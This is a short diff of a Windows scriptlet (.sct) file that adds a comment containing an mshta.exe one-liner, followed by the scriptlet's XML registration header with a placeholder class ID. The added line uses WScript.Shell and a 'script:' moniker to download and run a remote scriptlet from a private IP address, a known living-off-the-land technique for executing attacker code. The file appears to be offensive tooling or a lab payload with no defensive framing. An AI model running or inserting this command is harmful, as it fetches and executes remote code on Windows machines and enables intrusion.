@@ -1,3 +1,4 @@
+// mshta.exe "javascript:a=(new ActiveXObject('WScript.Shell')).Run((GetObject('script:http://192.168.45.223/test.sct')).Exec(),0);close();
 <?XML version="1.0"?>
 <scriptlet>
 <registration description="Desc" progid="Progid" version="0" classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"></registration>
